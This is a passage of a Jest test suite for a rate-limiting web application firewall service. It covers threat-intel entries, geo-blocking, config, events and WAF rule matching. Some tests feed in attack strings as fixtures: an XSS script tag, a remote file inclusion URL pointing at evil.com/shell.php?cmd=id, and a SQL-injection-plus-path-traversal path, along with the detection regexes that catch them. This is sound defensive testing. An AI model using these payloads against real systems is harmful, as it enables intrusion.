  });

  it('clears blocked requests', () => {
    service.addToBlacklist('10.0.0.1', 'bad');
    service.analyzeRequest({ ip: '10.0.0.1', path: '/x', method: 'GET', headers: {} });
    service.analyzeRequest({ ip: '10.0.0.1', path: '/y', method: 'GET', headers: {} });
    const result = service.clearBlockedRequests();
    expect(result.cleared).toBe(2);
    expect(service.getBlockedRequests().total).toBe(0);
  });
});

/* ═══════════════════════════════════════════════════════════════
   15. THREAT INTEL
   ═══════════════════════════════════════════════════════════════ */
describe('Threat intelligence', () => {
  it('adds an entry', () => {
    const entry = service.addThreatIntel({
      source: 'feed',
      ip: '10.0.0.99',
      type: 'botnet',
      confidence: 70,
      description: 'known botnet',
    });
    expect(entry.id).toBe('uuid-test-0001');
    expect(entry.source).toBe('feed');
    expect(entry.ip).toBe('10.0.0.99');
    expect(entry.type).toBe('botnet');
    expect(entry.confidence).toBe(70);
  });

  it('auto-blacklists high confidence >= 90', () => {
    service.addThreatIntel({
      source: 'intel',
      ip: '10.0.0.88',
      type: 'malicious',
      confidence: 95,
    });
    expect(service.ipBlacklist.has('10.0.0.88')).toBe(true);
  });

  it('does not auto-blacklist low confidence', () => {
    service.addThreatIntel({
      source: 'intel',
      ip: '10.0.0.77',
      type: 'suspicious',
      confidence: 50,
    });
    expect(service.ipBlacklist.has('10.0.0.77')).toBe(false);
  });

  it('throws if IP is missing', () => {
    expect(() => service.addThreatIntel({ source: 'x' })).toThrow('IP is required');
  });

  it('lists all entries', () => {
    service.addThreatIntel({ ip: '10.0.0.1', type: 'botnet', confidence: 60 });
    service.addThreatIntel({ ip: '10.0.0.2', type: 'scanner', confidence: 40 });
    const list = service.listThreatIntel();
    expect(list.total).toBe(2);
    expect(list.entries).toHaveLength(2);
  });

  it('filters by type', () => {
    service.addThreatIntel({ ip: '10.0.0.1', type: 'botnet', confidence: 60 });
    service.addThreatIntel({ ip: '10.0.0.2', type: 'scanner', confidence: 40 });
    const list = service.listThreatIntel({ type: 'botnet' });
    expect(list.total).toBe(1);
    expect(list.entries[0].type).toBe('botnet');
  });

  it('respects limit', () => {
    service.addThreatIntel({ ip: '10.0.0.1', confidence: 60 });
    service.addThreatIntel({ ip: '10.0.0.2', confidence: 60 });
    service.addThreatIntel({ ip: '10.0.0.3', confidence: 60 });
    const list = service.listThreatIntel({ limit: 2 });
    expect(list.entries).toHaveLength(2);
  });
});

/* ═══════════════════════════════════════════════════════════════
   16. GEO-BLOCKING (_checkGeoBlock)
   ═══════════════════════════════════════════════════════════════ */
describe('Geo-blocking', () => {
  it('passes when geoBlockEnabled is false (default)', () => {
    const result = service.analyzeRequest({
      ip: '10.0.0.1',
      path: '/',
      method: 'GET',
      headers: {},
      country: 'CN',
    });
    // geo check only runs if geoBlockEnabled && country
    expect(result.allowed).toBe(true);
  });

  it('_checkGeoBlock allows when country not in blockedCountries', () => {
    service.updateConfig({ geoBlockEnabled: true, blockedCountries: ['CN'] });
    const result = service._checkGeoBlock('10.0.0.1', 'US');
    expect(result.allowed).toBe(true);
  });

  it('_checkGeoBlock blocks country in blockedCountries', () => {
    service.updateConfig({ geoBlockEnabled: true, blockedCountries: ['CN', 'RU'] });
    const result = service._checkGeoBlock('10.0.0.1', 'CN');
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('geo-block');
    expect(result.reason).toContain('Country blocked');
  });

  it('_checkGeoBlock blocks when allowedCountries set and country not in list', () => {
    service.updateConfig({ geoBlockEnabled: true, allowedCountries: ['SA', 'AE'] });
    const result = service._checkGeoBlock('10.0.0.1', 'US');
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('geo-block');
    expect(result.reason).toContain('Country not allowed');
  });

  it('_checkGeoBlock allows country in allowedCountries', () => {
    service.updateConfig({ geoBlockEnabled: true, allowedCountries: ['SA', 'AE'] });
    const result = service._checkGeoBlock('10.0.0.1', 'SA');
    expect(result.allowed).toBe(true);
  });

  it('geo-block via analyzeRequest blocks country', () => {
    service.updateConfig({ geoBlockEnabled: true, blockedCountries: ['RU'] });
    const result = service.analyzeRequest({
      ip: '10.0.0.1',
      path: '/',
      method: 'GET',
      headers: {},
      country: 'RU',
    });
    expect(result.allowed).toBe(false);
    expect(result.action).toBe('geo-block');
  });

  it('geo-block skips if no country in requestInfo', () => {
    service.updateConfig({ geoBlockEnabled: true, blockedCountries: ['CN'] });
    const result = service.analyzeRequest({
      ip: '10.0.0.1',
      path: '/',
      method: 'GET',
      headers: {},
    });
    // No country → geo check skipped
    expect(result.allowed).toBe(true);
  });

  it('logs to geoBlockLog is tested via _logBlocked', () => {
    // _logBlocked pushes to blockedRequests; verify
    service._logBlocked({ ip: '10.0.0.1', reason: 'geo', method: 'GET', path: '/' });
    expect(service.blockedRequests).toHaveLength(1);
  });
});

/* ═══════════════════════════════════════════════════════════════
   17. DASHBOARD
   ═══════════════════════════════════════════════════════════════ */
describe('Dashboard', () => {
  it('returns all expected sections', () => {
    const dash = service.getDashboard();
    expect(dash.threatLevel).toBeDefined();
    expect(dash.analytics).toBeDefined();
    expect(dash.blockedLast1h).toBeDefined();
    expect(dash.topBlockedIPs).toBeDefined();
    expect(dash.topTriggeredRules).toBeDefined();
    expect(dash.activeIncidents).toBeDefined();
    expect(dash.blacklistSize).toBeDefined();
    expect(dash.whitelistSize).toBeDefined();
    expect(dash.greylistSize).toBeDefined();
    expect(dash.wafMode).toBe('block');
    expect(dash.wafEnabled).toBe(true);
    expect(dash.enabledRules).toBe(12);
    expect(dash.totalRules).toBe(12);
    expect(dash.rateLimitTiers).toBe(6);
    expect(dash.uptime).toBeDefined();
    expect(dash.timestamp).toBeDefined();
  });

  it('reflects state after operations', () => {
    service.addToBlacklist('10.0.0.1', 'bad');
    service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });
    service.reportIncident({ type: 'ddos' });

    const dash = service.getDashboard();
    expect(dash.blacklistSize).toBe(1);
    expect(dash.activeIncidents).toBe(1);
    expect(dash.analytics.blockedRequests).toBe(1);
  });

  it('shows topBlockedIPs and topTriggeredRules', () => {
    service.addToBlacklist('10.0.0.1', 'bad');
    service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });
    service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });

    const dash = service.getDashboard();
    expect(dash.topBlockedIPs.length).toBeGreaterThanOrEqual(1);
    expect(dash.topBlockedIPs[0].ip).toBe('10.0.0.1');
    expect(dash.topBlockedIPs[0].count).toBe(2);
  });
});

/* ═══════════════════════════════════════════════════════════════
   18. CONFIG
   ═══════════════════════════════════════════════════════════════ */
describe('Config', () => {
  it('getConfig returns a copy', () => {
    const cfg1 = service.getConfig();
    const cfg2 = service.getConfig();
    expect(cfg1).toEqual(cfg2);
    cfg1.ipRateLimit = 9999;
    expect(service.config.ipRateLimit).toBe(100); // unchanged
  });

  it('updateConfig merges allowed keys', () => {
    service.updateConfig({ ipRateLimit: 50, wafMode: 'detect' });
    expect(service.config.ipRateLimit).toBe(50);
    expect(service.config.wafMode).toBe('detect');
  });

  it('updateConfig ignores disallowed keys', () => {
    service.updateConfig({ hackerField: true });
    expect(service.config.hackerField).toBeUndefined();
  });

  it('updateConfig returns updated config', () => {
    const result = service.updateConfig({ alertThreshold: 20 });
    expect(result.alertThreshold).toBe(20);
  });

  it('resetAnalytics zeros all counters', () => {
    service.analytics.totalRequests = 500;
    service.analytics.blockedRequests = 100;
    service.analytics.challengedRequests = 50;
    service.analytics.passedRequests = 350;
    const result = service.resetAnalytics();
    expect(result.totalRequests).toBe(0);
    expect(result.blockedRequests).toBe(0);
    expect(result.challengedRequests).toBe(0);
    expect(result.passedRequests).toBe(0);
  });
});

/* ═══════════════════════════════════════════════════════════════
   19. EVENTS
   ═══════════════════════════════════════════════════════════════ */
describe('Events', () => {
  it('emits request:blocked when request is blocked', () => {
    const handler = jest.fn();
    service.on('request:blocked', handler);
    service.addToBlacklist('10.0.0.1', 'test');
    service.analyzeRequest({ ip: '10.0.0.1', path: '/', method: 'GET', headers: {} });
    expect(handler).toHaveBeenCalledTimes(1);
    expect(handler).toHaveBeenCalledWith(expect.objectContaining({ ip: '10.0.0.1' }));
  });

  it('emits request:blocked on WAF block', () => {
    const handler = jest.fn();
    service.on('request:blocked', handler);
    service.analyzeRequest({
      ip: '10.0.0.5',
      path: '/api?q=<script>alert(1)</script>',
      method: 'GET',
      headers: {},
    });
    expect(handler).toHaveBeenCalled();
  });

  it('emits request:blocked on rate limit', () => {
    const handler = jest.fn();
    service.on('request:blocked', handler);
    // Exceed burst limit
    for (let i = 0; i < 52; i++) {
      service.analyzeRequest({ ip: '10.0.0.11', path: '/api/test', method: 'GET', headers: {} });
    }
    expect(handler).toHaveBeenCalled();
  });

  it('emits incident:created on reportIncident', () => {
    const handler = jest.fn();
    service.on('incident:created', handler);
    service.reportIncident({ type: 'test-incident' });
    expect(handler).toHaveBeenCalledTimes(1);
    expect(handler).toHaveBeenCalledWith(
      expect.objectContaining({ type: 'test-incident', status: 'active' })
    );
  });
});

/* ═══════════════════════════════════════════════════════════════
   20. _logBlocked INTERNALS
   ═══════════════════════════════════════════════════════════════ */
describe('_logBlocked', () => {
  it('adds entry with timestamp', () => {
    service._logBlocked({ ip: '10.0.0.1', reason: 'test' });
    expect(service.blockedRequests).toHaveLength(1);
    expect(service.blockedRequests[0].timestamp).toBeDefined();
  });

  it('emits request:blocked event', () => {
    const handler = jest.fn();
    service.on('request:blocked', handler);
    service._logBlocked({ ip: '10.0.0.1', reason: 'test' });
    expect(handler).toHaveBeenCalledWith({ ip: '10.0.0.1', reason: 'test' });
  });

  it('trims to 500 entries max', () => {
    for (let i = 0; i < 510; i++) {
      service._logBlocked({ ip: `10.0.${Math.floor(i / 256)}.${i % 256}`, reason: 'flood' });
    }
    expect(service.blockedRequests.length).toBeLessThanOrEqual(500);
  });
});

/* ═══════════════════════════════════════════════════════════════
   21. WAF RULE IDS
   ═══════════════════════════════════════════════════════════════ */
describe('Default WAF rule IDs', () => {
  const expectedIds = [
    'sqli-01',
    'sqli-02',
    'sqli-03',
    'xss-01',
    'xss-02',
    'xss-03',
    'path-01',
    'cmd-01',
    'rfi-01',
    'bot-01',
    'proto-01',
    'size-01',
  ];

  it.each(expectedIds)('contains rule %s', id => {
    const rule = service.wafRules.find(r => r.id === id);
    expect(rule).toBeDefined();
  });
});

/* ═══════════════════════════════════════════════════════════════
   22. ADDITIONAL EDGE CASES
   ═══════════════════════════════════════════════════════════════ */
describe('Edge cases', () => {
  it('oversized payload triggers size-01 rule', () => {
    const bigBody = 'x'.repeat(10485761); // > 10MB
    const result = service._scanWafRules({
      ip: '10.0.0.1',
      method: 'POST',
      path: '/api/upload',
      headers: {},
      body: bigBody,
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('size-01');
  });

  it('protocol attack detected', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.1',
      method: 'CONNECT',
      path: '/proxy',
      headers: {},
      body: '',
    });
    // method is included in payload: "CONNECT /proxy ..."
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('proto-01');
  });

  it('remote file inclusion detected', () => {
    const result = service._scanWafRules({
      ip: '10.0.0.1',
      method: 'GET',
      path: '/api?file=http://evil.com/shell.php?cmd=id',
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(false);
    expect(result.ruleId).toBe('rfi-01');
  });

  it('concurrent instances are independent', () => {
    const s1 = new RateLimitWafService();
    const s2 = new RateLimitWafService();
    s1.addToBlacklist('10.0.0.1', 'only in s1');
    expect(s1.ipBlacklist.has('10.0.0.1')).toBe(true);
    expect(s2.ipBlacklist.has('10.0.0.1')).toBe(false);
  });

  it('WAF rules are deep-copied from defaults', () => {
    service.wafRules[0].enabled = false;
    const s2 = new RateLimitWafService();
    expect(s2.wafRules[0].enabled).toBe(true);
  });

  it('addWafRule with defaults for optional fields', () => {
    const rule = service.addWafRule({ name: 'Minimal', category: 'test' });
    expect(rule.severity).toBe('medium');
    expect(rule.pattern).toBeNull();
    expect(rule.description).toBe('');
    expect(rule.enabled).toBe(true);
  });

  it('analyzeRequest with body as object', () => {
    const result = service.analyzeRequest({
      ip: '10.0.0.1',
      path: '/api/data',
      method: 'POST',
      headers: {},
      body: { key: 'value' },
    });
    expect(result.allowed).toBe(true);
  });

  it('getBlacklist returns empty when no IPs blacklisted', () => {
    const bl = service.getBlacklist();
    expect(bl.total).toBe(0);
    expect(bl.entries).toEqual([]);
  });

  it('clearBlockedRequests returns 0 when empty', () => {
    const result = service.clearBlockedRequests();
    expect(result.cleared).toBe(0);
  });

  it('multiple WAF rules can fire — first match wins', () => {
    // A path with both SQL injection and path traversal
    const result = service._scanWafRules({
      ip: '10.0.0.1',
      method: 'GET',
      path: "/api/../admin?q=' OR 1=1",
      headers: {},
      body: '',
    });
    expect(result.allowed).toBe(false);
    // First matching rule wins — sqli-01 pattern: (?:'|")?\\s*(?:OR|AND)\\s+.*=
    // This matches "' OR 1=1" in the payload
    // path-01 pattern: \.\./|\.\.\\ — matches ../
    // Order in wafRules: sqli-01 is first
    expect(['sqli-01', 'sqli-02', 'sqli-03', 'path-01']).toContain(result.ruleId);
  });
});
